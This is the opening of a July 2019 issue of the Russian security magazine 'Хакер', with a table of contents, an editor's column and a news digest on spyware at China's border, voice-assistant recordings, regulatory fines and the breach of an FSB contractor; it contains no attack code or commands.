

                                               Июль 2019
            № 244
CONTENTS

     Shit gets real
  Колон ка главреда

    MEGANews
  Всё новое за последний месяц

     Android
  Скрываем ся от тро янов и готовимся к Android Q

    Постпостапокалипсис
  Кон ферен ция Offzone 2019

    Обходные пути
  Как атаки по сто рон ним каналам позволяют вык радывать дан ные и обхо дить шифрование

    Второй раунд
  Девять новых атак по обходным каналам на основе уязвимостей кеша

    Необыч ный вектор
  На лаживаем скры тые ком муника ции между про цессами в чипах Intel

    Аппарат ный CTF
  Легкий спо соб узнать ключ шифрования, когда у тебя под рукой осциллограф и ноутбук

    Проект Red Team
  Роли и области экспер тизы. Колонка Дениса Макрушина

    IBM X‐Force Red
  Как красная коман да IBM про веря ет орга низа ции на прочность

    Великий пакос тник
  Про бира емся через дебри IPv6 к root‐фла гу виртуалки с Hack The Box

    Часы наиз нанку
  Извлекаем и анализируем дан ные Apple Watch

    Изучаем ПЛК
  Крат кий гайд по поиску уязвимостей в про мышленных контроллерах

    От правляем команды
  Как зас тавить популярный сер верный почтовик выполнять про извольный код

    Ос новы циф ровой схемотех ники
  Со бира ем сум матор с ускорен ным переносом из дискретных микросхем

    Исходный кот
  Как зас тавить нейрон ную сеть оши биться

    Осторожно, мошенники!
  Как уго няют каналы в Telegram и что с этим делать

    Криптуем по‐круп ному
  Разбира емся с режимом гаммирова ния из ГОСТ 34.13—2015

    Загадочный Forth
  Зна комим ся с одним из важней ших языков программи рова ния, о котором мало кто знает

    Пот рошим Carbanak
  Как изнутри устроен известный бан ковский тро ян

   Магия iptables
  Необычные виды преобразова ний сетевых адре сов

    Стальная Киса
  За щища ем сетевой периметр на базе обо рудования Cisco

    Некромакинтош
  Ставим Linux на ста рин ный iBook, чтобы вдохнуть в него жизнь

   Физика нереального мира
  Школьная программа на стра же современ ного 3D

     Тит ры
  Кто дела ет этот журнал
HEADER
   SHIT
  GETS
  REAL

         КОЛОНКА ГЛАВРЕДА





В  этом  выпус ке  колонки  я  хотел  бы
поделиться  с  тобой  небольшой  личной
историей, оттолкнувшись от которой мы
потом поговорим обо всяких гло бальных       Андрей Письменный
                                                                                      Главный редактор
                                                                                      apismenny@gmail.comи возвышенных вещах. История эта про‐
изошла в начале года на кон ференции ком‐
пании Check Point.


Обычно после окончания публичных выступлений журналис там предлагают
встретиться со спикерами и задать им вопросы. Я никогда не отказываюсь
и потом привожу для «Хакера» какое‐нибудь интервью. Так было и в этот
раз — я пообщался с руководителем исследова тельского подразделения
Check Point Янивом Балмасом. Осо бенно мне, кста ти, понравилась его исто‐
рия про взлом факсов.
  А вот мой разговор с коллегой Янива (умышленно не называю его имя)
тогда в публикацию не пошел, но с ним свя зан занятный эпизод. Когда я уже
выключил диктофон и стал собираться, исследователь попросил меня тоже
ответить на один вопрос. Причем зву чал он настоль ко обте каемо, что я даже
не сразу понял, о чем идет речь. «Какой ты видишь текущую ситу ацию
с кибербезопасностью?»
  Надо сказать, почти в каждой поез дке ко мне кто‐нибудь да подходит
с разговорами про русских хакеров. Чаще в шутку, но иногда на пол ном серь‐
езе просят рассказать, что я знаю о блекхетах на службе у правительства РФ.
Я обычно на такие запросы только раз вожу руками — мол, если бы и знал
что‐то, вряд ли стал бы вам рассказывать.
  Но стоило мне начать по привычке сливаться, как собеседник помотал
головой: нет, речь вооб ще не о Рос сии. Так что же тогда? Что нового я могу
рассказать сотруднику Check Point о ландшафте киберугроз? Я при задумал‐
ся. А подумав, решил попробовать отзу мить максимально далеко. Что про‐
исходит в целом? В голову пришло сразу нес колько мыслей, которы ми я
поделюсь и с тобой.
  Первая мысль впол не очевидная, и крутится она в голове не у меня одно‐
го. Знал бы ты, сколь ко статей, присыла емых в «Хакер» новыми авторами,
начинаются с пассажей вроде «технологии все более плотно входят в нашу
жизнь». Потом, конечно, редактор выкидывает эту фразу, чтобы не было
банальщины и общих слов.
  Тем временем спра ведливость это го утверждения мы все непрерывно
ощущаем: когда, одержав победу над сайтом РЖД, браво объ являем кон‐
дуктору: «Электронная регистра ция»; когда записы ваемся в поликлинику
через Telegram (не шучу, я так делал); когда получа ем посыл ки на почте «по
упрощенке» — при помощи штрих‐кода в приложении и верификации
по SMS. И это не говоря про банковские при ложения, заказ такси, разнооб‐
разные доставки, аренду ску теров и велосипедов, а также Airbnb, «Алиэкс‐
пресс» с «Ебеем»,  Tinder,  Twitter и прочие прелести цифровой жизни.
Или просто жизни?
  Помню, как в девяностые годы было странно впервые увидеть URL,
напечатанный на билборде: «Ого, указали сайт! Прогрессивно!» А через
двадцать лет уже и не обра щаешь внимания на то, что пакет с молоком про‐
сит подписаться на инстаграм, а кукурузные хлопья заманивают игрой
с дополненной реальностью.
  Компьютер давно перестал быть бежевым ящиком, который включают
пару раз в день, чтобы, скажем, поиг рать или скачать из интерне та чужой
реферат и распечатать. Постоянно вклю ченная «персоналка» теперь в кар‐
мане у каждого, и для этого каждого она важнее и персональнее, чем ког‐
да бы то ни было.
  Возможно, ты помнишь раз говоры на тему «винда — маздай» и то, что они
были уделом группки избранных. Теперь мнение о том, какая мобильная
платформа лучше и правильнее, есть практически у каждого встречного.



    — Ты что, Васян, айфон же для педиков!
    — Нет, Серега, дело не в этом. Прос то Face ID надежно защища ет
     мои данные, а кураторы App Store заботятся о том, чтобы в приложе-
      ниях не было вре донос ных функций.

В общем, мир серьезно изменился, и статистика это подтверждает еще луч‐
ше, чем личные наблюдения.





  Статистика International Telecommunications Union, график из «Википе ‐
  дии»

Число людей, пользующихся интернетом, в раз витых странах выросло с 17%
в 1998 году до более чем 80% сейчас. То есть избе жать взаимодействия
со всемирной сетью удается только каждому пятому. В раз вивающихся стра‐
нах — каждому вто рому, но надолго ли? Самые дешевые смартфоны срав‐
нялись по цене с электрическими чайниками уже лет пять назад.
   Если подытожить, то мы имеем:
 • два с половиной миллиарда новых пользователей с самым разным
   (чаще — невысоким) уровнем подготовки;
 • устройства, которые лежат в кармане и предос тавляют доселе невидан‐
  ные удобства, без час ти которых уже сложно обойтись;
 • огромное количество других устройств, которые тоже по сути компьюте ры
   и которых в окружающей среде все больше (а обойтись без них и подавно
   непросто).

И изменения в сфере ИБ мы видим соответству ющие. Когда страшным
вирусом заражалась «бежевая короб ка», то под угрозой оказывался всего
лишь реферат. Потом коробке форматировали винчестер и все возвра‐
щалось на круги своя. Да и сами заразители тогда трудились ради славы
и лулзов или просто потому, что могли.
   Если же зараза попадает на современный смартфон, можно не сом‐
неваться: ее владельцы попытаются выжать из этого прибыль все ми воз‐
можными способами. Сло во «криминализация» прочно заняло место в отче‐
тах ИБ‐компаний лет десять назад и с тех пор уже успело покинуть их
за ненадобностью.
  И наконец, последнее наб людение: эффект, который я про себя называю
«отсыхающими приставками». Известно, что, когда какое‐то слово уточняют,
чтобы обозначить улучшенное устройство или новую техническую базу,
это уточнение со временем теря ется.
  Например, «шариковая ручка» ста ла прос то ручкой, а перьевую мы
называем «перьевой»; «почта» стала «бумаж ной почтой», потому что нор‐
мальная почта — это электронная; слово «смартфон» еще встре чается
в обзорах, но не в живой речи.





  «Почта России» идет про тив тренда. Фото Константина Коновалова
  @CKonovalov

Точно так же «информационная безопас ность» — это в нашем новом мире
просто  безопасность,  а  «киберпреступность» — прос то преступность.
По крайней мере, до тех пор, пока это слово не станет означать нападение
банды киборгов. Но ведь и к этому привыкнем, верно?
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





КИТАЙ ШПИОНИТ
ЗА ТУРИСТАМИ
Журналисты Vice Motherboard, Süddeutsche Zeitung, The Guardian, New York
Times и немецкой вещательной компании NDR обнаружили, что китай ские
пограничники устанавливают на смартфоны турис тов мал варь.
  Судя по всему, проб лема акту альна только для региона Синьцзян, который
ранее уже оказывался в центре крупного скандала: в прошлом году СМИ ста‐
ло известно о масштабной кампании, разверну той с целью пристальной
слежки за местным мусульманским населением в данном регионе.
   Теперь пресса сооб щает, что в Синь цзян на мобильные устрой ства турис‐
тов, пересекающих границу, устанавлива ют шпионское ПО. Так, местные пог‐
раничники просят туристов раз блокиро вать мобильные гаджеты, а затем уда‐
ляются с ними для проведения про верки. Для поль зовате лей iPhone проверка
вклю чает в себя подключение смартфона к компь ютеру, с целью изучения
содержимого телефона.
  Но для Android все заходит еще дальше, и сот рудники пограничной службы
устанавливают на устройства шпионское приложение BXAQ или Fēng cǎi,
копии которого удалось получить редакциям Süddeutsche Zeitung и Mother‐
board. Один из репор теров Süddeutsche Zeitung и вовсе лично пересек гра‐
ницу и получил ту же самую вредоносную прог рамму на свой телефон.



      «[Это приложе ние] является еще одним доказа тельством того, что
      в Синьцзяне осу ществляется мас совая слежка. Мы уже зна ли, что
      жители Синьцзяна, особенно тюр ки‑мусульмане, подвергаются круг-
      лосуточ ному и мас штабному наблюдению в регионе. Но то, что обна-
      ружили вы, выходит за рам ки. Это доказы вает, что даже инос транцы
      под вергаются  такому же мас совому и  незаконному  надзору», —
      говорит стар ший науч ный сотрудник Human Rights Watch Майя Ван.

По просьбе журналистов, шпионское при ложение изучили ИБ‐эксперты ком‐
пании Cure53 (от лица фонда Open Technology Fund), исследователи Citizen
Lab из университета Торонто, а также специалис ты Рурского университета.
   Анализ показал, что пос ле уста новки на устройство BXAQ собирает все
записи из календаря телефо на, список контактов, журналы вызовов и тексто‐
вые сообщения, а затем загружает их на удаленный сервер. Также малварь
сканирует зараженный девайс, изу чая, какие при ложения на нем установ‐
лены, и в некоторых случаях извлекает имена пользователей из установ‐
ленных приложе ний.
  Интересно, что приложение вовсе не пытается скрыться от пользовате ля.
Вместо этого на экране устройства появляет ся значок, поз воляющий удалить
мал варь с телефона после ее использования. Очевидно, удалять при ложе ние
должны сами пограничники, но они зачастую забывают это сделать.





Также эксперты обнаружили в код приложения хэши более 73 000 раз личных
файлов, которые и сканирует BXAQ. Как правило, сложно сопос тавить такие
хэши с конкретными файлами, но исследователи смогли идентифицировать
около 1300 из них. В основном это было про дела но с использовани ем Virus
Total, а также эксперты наш ли другие копии этих файлов в интернете.
  Выяснилось, что многие из ска нируемых файлов действительно содержат
явно экстремистский контент, например, пуб ликации журнала Rumiyah, при‐
надлежаще го запрещенной в РФ ИГИЛ. Но также при ложе ние ищет выдержки
из Корана, PDF‐файлы, связанные с Далай‐ламой, и музыкальные файлы
японской группы Unholy Grave.
  Еще одним из файлов из «черного списка» является книга «Сирийский
джихад», написанная Чарльзом Листером, ведущим исследователем тер‐
роризма, старшим научным сотрудником и главой программы по противодей‐
ствию терроризму и экс тремизму в Инсти туте Ближнего Вос тока. Лис тер
сообщил журналистам, что впервые слышит о таком, и предположил, что
власти Китая считают любую книгу, в чьем названии присутс твует слово «джи‐
хад», потенциально подоз ритель ной.
  Ни официальные предста вители китайских властей, ни представители
компании Ninjing FiberHome StarrySky Communication Development Company
Ltd, частично принадлежащей государс тву и разработавшей то самое при‐
ложение, не ответили на запросы журналис тов и не прокомментировали ситу‐
ацию.


600 000 ПОЛЬЗОВАТЕЛЕЙ TOR В РОССИИ

Согласно официальной ста тистике, опубликованной на сайте Tor Project, 11 июля 2019 года
браузером Tor воспользовались почти 600 000 пользователей из Рос сии. Таким образом, Рос‐
сия с большим обрывом обогнала США, Иран, Германию и Индо незию.





Предыдущий рекорд был установлен в 2015 году, ког да Рос комнадзор заблокиро вал RuTracker,
и браузером Tor пользовались до 400 000 людей в сутки, но потом их количес тво пос тепенно
сократилось.


Интересно, что еще весной текущего года количес тво пользователей Tor в РФ не пре вышало
300 000 человек, но в апреле ситуация начала стремительно меняться. Исторический мак‐
симум количества посетителей из РФ обновился несколько раз за пос ледние месяцы: это про‐
изошло 30 апреля, 13 и 20 мая, а также 9 и 11 июля 2019 года.





С чем именно связаны эти скачки популяр ности, и какое количество трафика генерируют боты,
а не живые люди, сказать сложно. Представители Tor Project разводят руками и сообщают, что
каких‐либо выводы о происхождении скачков на графике делать рано.





AMAZON И GOOGLE
ВНИМАТЕЛЬНО
СЛУШАЮТ
Компании  Amazon  и  Google  признали,  что  раз говоры  пользователей
с ассистентами Alexa и Google Assistant регулярно слу шают живые люди.


Amazon
Еще в мае текущего года сенатор США Крис Кунс (Chris Coons) направил
письмо  руководству  компании  Amazon,  в  котором  поинтересовал ся,
как именно та хранит разговоры пользователей (аудиофайлы и сте нограммы
их расшифровок), записанные в ходе общения с такими устройствами,
как Echo и Echo Dot, с Alexa на борту.
  Официальный ответ компании был опубликован в начале июля, и неприят‐
но удивил многих. Amazon сооб щила, что хра нит голосовые записи и сте ног‐
раммы до тех пор, пока пользователь не решит их удалить. «Когда клиент уда‐
ляет голосовую запись, мы уда ляем рас шифровки, связанные с учетной
записью пользователя, как по запросу клиента, так и по ответу Alexa», — гла‐
сит ответ компании. Однако все не так прос то, как кажется на первый взгляд.
Фактически Amazon признала, что хра нит пользовательские данные, сколько
пожелает, если только пользователь пря мо не укажет обратное.
  Дело в том, что если пользователь не знает, как удалить записи вручную,
Amazon продолжит хранить их, а в некоторых случаях рас шифровки будут сох‐
ранены даже после уда ления самой аудиоза писи. Причем пользователь
об этом не узнает, а Amazon не уточняет, как дол го хра нит подоб ные данные.
   Хуже того, даже если аудио все же было удалено, компания все равно
может хранить другие записи вза имо действий клиентов с Alexa, включая
записи действий, предпринятых Alexa в ответ на запрос пользователя.
  Дело в том, что сама Amazon, а также третьи стороны, которые соз дают
специальные skills для Alexa, ведут постоянный учет взаимодействий поль‐
зователей с голосовым помощником. К примеру, пользователь заказы вает
пиццу, приобретает цифровой контент или вызывает автомобиль. В таких слу‐
чаях Amazon и сторонним разработчикам «навыков» нужно вести учет про‐
исходящего и осуществлен ных транзакций. Яко бы это помогает легко пов‐
торить задачу и удоб но для пользователей. При этом Amazon не сообщает,
какие именно данные содержатся в подобных записях.
  Известно, что записанная информация не является анонимной, а рас‐
шифровки связаны с учетными записями клиентов. Так, Amazon использует
эти стенограммы для обучения как сво их сот рудников, систем обработки
естественного языка и «обучения» Alexa. Ранее СМИ сообщали, что для этого
многие сотрудники компании (некоторые из которых даже не работают
в Amazon напрямую) имеют доступ к головным записям и их расшифровкам,
и слушают до 1000 аудиоклипов в день. Именно эта информация и заин‐
тересовала сенатора Кунса, побудив  его направить компании письмо
с рядом вопросов.
   Также в ответе компании сооб щается, что на серверах Amazon оседают
и другие типы запросов к Alexa, к примеру, связанные с установкой будиль‐
ника, напоминаниями или событиями кален даря. «Наши клиенты не хотят и не
ожидают, что удаление аудиозаписи повлечет за собой удаление базовых
данных и помешает Alexa выполнить поставлен ную задачу», — аргументируют
разработчики.



      «Ответ Amazon не исклю чает того, что сте нограммы голосового вза-
     имодействия пользовате лей с Alexa не уда ляются со всех сер веров
      ком пании Amazon даже пос ле того, как пользователь уда лил запись
      своего голоса. Более того, оста ется неяс ным, в какой сте пени эти
      данные переда ются третьим сторонам, и как эти третьи стороны
      используют и контролиру ют эту информа цию», — резюмирует сенатор
       Кунс.


Google
Бельгийский вещатель VRT NWS сообщил, что в распоряжении редакции ока‐
зались 1000 записей переговоров пользователей с голосовым ассистентом
Google Assistant, который используется в девайсах Google Home, Android‐
устройствах и Chromebook. Так как записи содержали различную конфиден‐
циальную информацию (адреса, имена и так далее), журналистам удалось
«опознать» и найти некоторых из фигури ровавших на записях людей, и те
подтвердили,  что аудио действительно содержит  их  голоса и  личную
информацию.
   Хотя обращение к Google Assistant должно начинаться с ключевых фраз
«OK, Google» или «Hey, Google», по данным VRT NWS, 153 из 1000 записей
были сделаны без этих команд и являлись обычными раз говорами, которые
вообще не должны были фиксировать ся. Так, журналисты обнаружили «раз‐
говоры  в  спальне, раз говоры между родителями и  детьми,  скандалы
и рабочие телефонные звонки, содержащие много личной информации».
   Вскоре представители Google были вынуждены опубликовать офи циаль‐
ный ответ на случившееся. Как ока залось, утечку данных гол ландских поль‐
зователей допустил один из подрядчи ков Google, нарушивший правила
безопасности и конфиденциальнос ти. Дело в том, что компания действитель‐
но передает аудиозаписи пользователей сто ронним компаниям‐подрядчи‐
кам, где с ними работают эксперты, разбираясь в нюансах раз ных язы ков
и акцентов, транскрибиру ют отдельные отрывки и тем самым помогают обу‐
чать Google Assistant.
  По заверениям разработчиков, в руки сторонних экспертов попадают
лишь 0,2% всех записей. Причем эти записи не свя заны с аккаунтами кон‐
кретных людей, и рецензенты должны не расшифровывать фоновые раз‐
говоры или прочие не относящиеся к делу шумы. Тем не менее, разработчики
признают, что порой Google Assistant может оши бать ся и принимать какой‐то
фоновый шум или слово в раз говоре за команду «OK, Google», после чего
устройство начинает «слушать» и записывать.
  В Google заверили, что специалис ты компании уже занимаются рассле‐
дованием инцидента и обязательно примут необходимые меры.


РУНЕТ СТАНОВИТСЯ ЧИЩЕ
Аналитики Group‐IB и Центра реагирования на инциденты кибербезопасности CERT‐GIB приш‐
ли к выводу, что по итогам 2018 года российская доменная зона достигла рекордных показа‐
телей по снижению объема токсичных сайтов.

Хотя, по данным компании, в 2018 году был отмечен общий 46% при рост чис ла потенциально
опасных сайтов (содержащих фишинг или малварь), на долю рунета пришлось менее 20%
таких ресурсов. Причем еще в 2017 году доля токсичных ресурсов в зоне RU составляла почти
50% среди всех заблокирован ных специалистами.





Использование доменов в зоне RU стало менее привлекатель ным для злоумышленников:
количество опасных доменов, заблокированных CERT‐GIB в рунете, уменьшилось на 40%
по сравнению с 2017 годом.

Злоумышленники все чаще отдают предпочтение зоне .com: за 2018 года количество ток‐
сичных ресурсов там увеличилось почти в 3 раза.

Кроме того, преступники стали чаще выбирать новые домены верхнего уровня «NewgTLD»
(.online, .website, .space и так далее).

Общее количество фишинговых ресурсов, располагающихся в различных доменных зонах,
включая RU, увеличилось на 77% по сравнению с 2017 годом. Так, 2018 году была приостанов‐
лена деятельность 4494 сайтов, использующихся в целях фишинга. Но только 10% сайтов
пришлось на домены в российской зоне (458 ресурсов), тог да как в 2017 году на их долю при‐
ходилось 27%.





КРУПНЫЕ ШТРАФЫ
ДЛЯ КРУПНЫХ
КОМПАНИЙ
В этом месяце все мировые СМИ сообщили о том, что Facebook была оштра‐
фована американскими влас тями на рекордные 5 млрд дол ларов из‐за
нарушения приватности пользователей. Однако социальная сеть – далеко
не  единственная   крупная  компания,   которую   власти   «наказали»
в июле 2019 года.


British Airways
В сентябре 2018 года представители авиакомпании British Airways сообщили
о компрометации данных пользователей своего сайта (ba.com) и мобильного
приложения. Под угрозой оказались все пользователи, осуществлявшие бро‐
нирование через официальный сайт или приложение компании в период
с 21 августа по 5 сентября 2018 года. Суммарно инцидент затронул око‐
ло 500 000 человек, и хотя информа ция о паспортах и маршрутах клиентов
в ходе утечки не пострадала, их личные и финансовые данные оказались
в руках неизвестных зло умышленников.
   Теперь Управление Комиссара по информации Великобритании (ICO)
обязало British Airways выплатить штраф в раз мере 183 000 000 фунтов
за утечку пользовательских данных. В сооб щении ICO говорится, что из‐за
ненадлежащих мер по обеспечению безопас ности компрометации подвер‐
глись имена и адреса клиентов авиакомпании, а также их учетные данные,
данные платежных карт и детали бронирований. Более того, по данным ICO,
атака началась не в августе, а в июне 2018 года.
   Столь крупный размер штрафа объясня ется тем, что инцидент произошел
уже после вступления в силу Общего рег ламента по защите данных (GDPR)
в мае 2018 года. В ито ге на British Airways был наложен штраф в раз‐
мере 183,39 млн фунтов, что эквивален тно 1,5% общего оборота компании
за финансовый год 2017  (и меньше возможного максимума в 4%, то
есть 450 млн фунтов).
  Представите ли British Airways сообщают, что удивлены и разочарованы
таким поворотом событий. В авиакомпании подчеркивают, что сотрудничали
с властями, опе ративно отреагирова ли на ата ку, и в итоге не обнаружили
никаких признаков мошенничес тва, связанных с похищенными данными поль‐
зователей. Теперь у компании есть 28 дней, чтобы обжаловать штраф
и решение ICO, чем в British Airways пообещали вос пользоваться.


Equifax
В начале сентября 2017 года ста ло известно о масштабной утечке данных,
которую допустило одно из крупнейших бюро кредитных историй в мире,
Equifax. Тогда представители североамериканско го под разде ления Equifax
сообщили, что неизвестные зло умыш ленники завладели личной информа‐
цией примерно 145 млн человек (всего в США проживает 324 млн человек),
вклю чая их номера социального страхования и водительских удостоверений,
полные име на, и адреса. Также постра дали 15,2 млн жителей Великоб‐
ритании и около 8000 канадских пользователей.
  Позже выяснилось, что мас штабы инци дента были даже серьезнее, чем
предполагалось изначально. Так, компромета ции подверглись не только
вышеперечисленные данные, но и инди виду аль ные номера налогоплатель‐
щиков (в США ими поль зуются те, кто не имеет номера социального стра‐
хования), email‐адреса пользователей, данные о водительских удостовере‐
ниях (в частности, даты и мес та выдачи документов) и даже информация
о банковских картах.
  В этом месяце Equifax, наконец, сумело урегулировать юридические проб‐
лемы, возникшие после этой масштабной утечки. В результате судебные раз‐
бирательства по искам, поданным Федеральной торговой комиссией США
(FTC), государственными прокуро рами, а также по коллективному иску от пос‐
традавших, были приостановлены.
  В рамках соглашения, заключенного с Федераль ной торговой комиссией,
Бюро финансовой защиты потребителей и 50 штатами и округами США,
Equifax обязуется выплатить пос традавшим сторонам не менее 575 мил‐
лионов долларов и вплоть до 700 миллионов долларов.
  Около 300 миллионов долларов из этой суммы будут направлены в фонд,
который  предоставит  пострадавшим  пользователям  услу ги  кре дитного
мониторинга. Также данный фонд компенсирует зат раты тем потребите лям,
которые из собственного кармана приобрели услуги по кредитному монито‐
рингу или мониторингу личности у Equifax и понесли другие рас ходы в резуль‐
тате взлома.
   Если исходных 300 миллионов окажет ся недос таточно, впоследс твии
Equifax добавит в фонд еще 125 миллионов.
   Также  Equifax  выплатит  штра фы  в  размере  175  миллионов  дол‐
ларов 48 штатам США, окру гам Колум бия и Пуэрто‐Рико, а также 100 мил‐
лионов долларов в адрес Бюро финансовой защиты потребителей.
  Кроме того, начиная с янва ря 2020 года бюро кредитных историй обязует‐
ся предоставлять своим клиентам по шесть бесплатных кре дитных отчетов
каждый год на протяжении семи лет (сей час в год можно заказать всего один
бесплатный отчет).


Google
Еще в прошлом месяце глава РКН Александр Жаров сообщил, что он недово‐
лен тем, что в мае филь тра ция зап рещенного контента в Google упала
до уровня около 67,5 – 70%, хотя еще в апреле из поисковой выдачи уда‐
лялось 80% запрещенного контента.



     «Мы уже в процес се сос тавле ния [протокола], админис тра тив ное дело
      находится в процес се раз вития, пос кольку ситу ация с фильтра цией
      зап рещенного тра фика ком пании Google не меняется. Грозит им [кор-
      порации Google] штраф в 700 000 рублей. Думаю, до конца июля точ-
      но уже все фор мальные процеду ры пройдут: сос тавле ние протокола,
      приглашение пред ста вите ля ком пании на протокол. Но вдруг Google
      все исполнит. Мы стре мим ся к тому, чтобы закон был исполнен, а не
     штра фовать», — говорил Жаров.

В итоге 18 июля 2019 года стало известно, что Роскомнадзор все же оштра‐
фовал компанию Google на 700 000 рублей, как и предполагалось.



      «Ком пания  не выполнила  тре бова ния  закона “Об информа ции…”
      по   исклю чению   из   результатов   поис ковой   выдачи  ссы лок
      на  интернет‑ресур сы  с  противоп равной  информа цией,  дос туп
       к которым огра ничен на тер ритории Рос сии. Контрольным мероп-
      риятием зафик сирова но, что Google производит выбороч ную фильтра-
     цию поис ковой выдачи - более тре ти ссы лок из единого реес тра зап-
     рещенной информа ции сохраняются в поис ке», — гла сит официальное
      заяв ление регулятора.

В РКН напомнили, что, согласно рос сийско му законодательству, опе раторы
поисковых систем обязаны исключать из результатов поис ковой выдачи
ссылки на интернет‐стра ницы с запрещенной информацией. Для этого они
должны подключиться к Федеральной государс твенной информационной
системе (ФГИС), содержащей перечень таких стра ниц.
   Также подчеркивается, что «предста вителям компании Google неод‐
нократно разъяснялись данные требования закона».
  Напомню, что в начале 2019 года Роскомнадзор уже штрафовал Google
на 500 000 рублей из‐за неприсоединения к Федеральной государственной
информационной системе.


D-Link
Два года назад Федеральная торговая комиссия США (US Federal Trade Com‐
mission) подала судебный иск против тайвань ско го производителя D‐Link,
обвиняя компанию в иска жении фактов о безопасности своих продуктов, про‐
дающихся на территории США. Кроме того, D‐Link обвинили в том, что про‐
изводитель не стал исправлять ряд проб лем в сво их продуктах, даже после
того как о них стало извес тно официально. Фактически ФТК обвинила тай‐
ваньскую компанию в грубой халатности, что поставило под угрозу тысячи
пользователей.
   Теперь, два года спустя, юридический спор, наконец, был урегулирован.
ФТК и тайваньский произво дитель приш ли к сог лашению, согласно которому,
D‐Link обязали проводить регулярные аудиты и внедрить новые механизмы
для обеспечения безопасности маршрутизаторов и камер.
   Аудиты будет проводиться раз в два года, и выбирать незави симую ком‐
панию‐аудитора будут предста вители Федеральной торговой комиссия. D‐
Link, в свою очередь, оста вили право решать, какие именно сертификаты
должен иметь аудитор, прежде чем компания допустит его до своих систем
безопасности.
  Новая программа безопас ности для маршру тиза торов и камер компании
должна включать в себя механизмы моделирова ния угроз, тестирование про‐
дуктов на наличие уязвимос тей перед их выпус ком, пос тоянный мониторинг
на предмет уязвимостей, автоматические обновления прошивок устройств,
а также D‐Link обязуется принимать и рас сматривать отчеты об уязвимостях,
полученные от сторонних ИБ‐специалистов.
  Представите ли D‐Link уже опубликовали официальный пресс‐релиз, пос‐
вященный завершению судебного раз бирательства. В документе компания
выражает радость в свя зи с дос тижени ем мирового соглашения с влас тями
и под черкивает, что ФТК все же не признала D‐Link ответс твенной за пред‐
полагаемые ранее нарушения, а также не обложила производите ля штрафом.
Представители компании называют решение ФТК «разумной государс твен‐
ной политикой», которая в целом поможет улучшить безопасность продуктов,
данных и конфиденциаль ность пользователей.


ВОЗНЯК ВСЕ ЕЩЕ ПРОТИВ FACEBOOK
Еще в прошлом году, после того как компания Facebook оказалась вовлечена в скандал с Cam‐
bridge Analytica, сооснователь Apple Стив Возняк удалил свой аккаунт в социальной сети
и призвал других пользователей сделать то же самое.
   За прошедший год позиция Возняка по данному вопросу сов сем не изме нилась, и он
по‐прежнему обеспокоен тем, что крупные технологические компании вторгаются в частную
жизнь пользователей.





→«Все это очень меня волнует, но не думаю, что мы можем это остановить. Они могут изме‐
рять ваше сердцебиение с помощью лазер ных датчиков или слу шать ваши раз говоры
с помощью множества разных мобиль ных устройств. Кто знает, не слу шает ли кто‐нибудь мой
смартфон прямо сейчас? Про Alexa уже часто говорят в новос тях... Поэто му я волнуюсь. У всех
нас есть разговоры, которые мы считаем частными, слова, которые мы говорим, и которые
не нужно слушать. Но все это практически невозможно остановить.
   Конечно, существует много разных людей, и для некоторых пре иму щес тва, которые дает
Facebook стоят того, чтобы лишиться конфиден циальнос ти. Но для мно гих других людей,
для таких как я, все иначе. И я рекомендуют большинству пользоваете лей най ти спо соб отка‐
заться от Facebook».
— Стив Возняк журналистам TMZ





                                     Продолжение статьи →
← Начало статьи





 ВЗЛОМАН
 ПОДРЯДЧИК ФСБ
  В 20‐х числах июля сразу ряд изданий сооб щили о взломе подрядчи ка ФСБ,
  московской компании «Сайтэк».
     Атакующие, скрывающиеся под псевдонимом 0v1ru$, разместили нес‐
   колько скриншотов в Twitter (например, скрин шоты папки «Компьютер», пред‐
  положительно принадлежавшей жертве), а также поделились похищенными
  данными с «коллегами» из группировки Digital Revolution. Те, в свою очередь,
  тоже опубликовали Twitter ряд доказа тельств взлома и привлекли к происхо‐
  дящему внимание прессы.
      Так, в открытый доступ выложили скрин шот интерфейса внутренней сети,
  а рядом с названиями проектов («Ари он», «Реляция», «Гривна» и так далее)
   стояли име на их кураторов, сот рудников «Сайтэк».





  Сообщается, что компрометация «Сай тэк» про изошла 13 июля 2019 года,
  и атакующие взло мали сервер Active Directory, откуда проникли к сеть ком‐
   пании, в том числе, получив дос туп к JIRA. В итоге было похище но 7,5 Тб дан‐
   ных, а сайт подвергся дефейсу.
    Похищенными у «Сайтэк» документами хакеры поделились с журналис‐
  тами нескольких изданий, вклю чая «Русскую службу Би‐би‐си».
     Из архива, который оказался в распоряжении издания, следует, что ком‐
  пания выполняла работы как минимум по 20 непубличным IT‐проектам,
   заказанным российскими спецслуж бами и ведомствами. Подчеркивается, что
  бумаги не содержали каких‐либо пометок о государственной тайне или сек‐
  ретности.
     Также дамп содержал довольно подробное описание проектов «Сай тэк»,
   в числе которых были:
    Наутилус‑С: главная задача про екта — деанонимизировать пользовате‐
  лей браузера Tor. Разработан в 2012 году по заказу НИИ «Квант». Включает
   в себя выходной узел Tor, через который и могла осуществляться слежка
  или даже подмена трафика. Интересно, что в 2014 году похожие атаки уже
  обнаруживали специалис ты из Университета Карл стада, и часть опасных
   узлов уже тогда связывали с Рос сией.
    Наутилус: создан для сбо ра информа ции о пользователях соцсетей.
  В документах указан срок работ (2009‐2010 годы) и их стоимость (18,5 млн
  рублей). Журналистами не удалось выяс нить, нашла ли «Сайтэк» заказчика
  на этот проект. Следить предполагалось за поль зователями Facebook, My‐
  Space и LinkedIn.
    Награда:  научно‐исследовательская  работа,  которая  проводи лась
   в 2013‐2014 годы. Изучались «возможности раз работки комплекса проник‐
  новения и скрытого использования ресурсов пиринговых и гибридных сетей».
  Заказчик данного проекта в документах не ука зан. Похоже, спе циалисты
  «Сайтэк» планировали найти уяз вимость в протоко ле BitTorrent, а также ком‐
  панию интересовали про токолы Jabber, OpenFT и ED2K.
    Наставник: заказчиком этого проекта выступала войсковая часть №
  71330 (предположитель но, радиоэлектронная раз ведка ФСБ России). Целью
  «Наставника» был мониторинг электронной почты по выбору заказчика. Про‐
   ект был рассчитан на 2013‐2014 годы. «Нас тавник» можно было нас троить
  таким образом, чтобы он проверял почту нужных респондентов в заданный
  промежуток  времени  или  собирал  «интеллектуальную  группу  добычи»
  по заданным словосочета ниям.
    Надеж да: проект посвящен соз данию программы, которая накапливает
  и визуализирует информа цию о том, как российский сегмент интернета свя‐
  зан с глобальной сетью. Заказчиком работы, проводившейся в 2013‐
  2014 годы, стала все та же войсковая часть № 71330.
    Москит: еще один заказ войсковой части №  71330, имевший место
   в 2015 году. В рамках проекта про водилась иссле довательская работа
  по созданию «программно‐аппа ратного комплекса», способного анонимно
